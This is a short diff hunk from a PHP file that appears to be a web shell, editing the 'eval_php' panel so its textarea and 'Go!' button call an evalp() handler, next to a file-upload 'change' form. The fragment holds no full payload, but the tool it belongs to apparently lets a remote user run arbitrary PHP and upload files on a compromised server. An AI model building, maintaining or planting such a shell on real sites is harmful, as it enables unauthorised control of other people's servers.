@@ -146,8 +146,8 @@ Disable Function : $show_ds";
 exit;
 } elseif(isset($_REQUEST['eval_php'])) {
 echo "<hr>";
-echo '<textarea id="evalp" class="hasilshell"></textarea><br><br>
-<input onclick="KeDirektori();" type="submit" value="Go!"/>';
+echo '<textarea id="evalphp" class="hasilshell"></textarea><br><br>
+<input onclick="evalp();" type="submit" value="Go!"/>';
 exit;
 } elseif(isset($_REQUEST['change'])) {
 echo "<hr><form enctypr='multipart/post-data' method='post'>
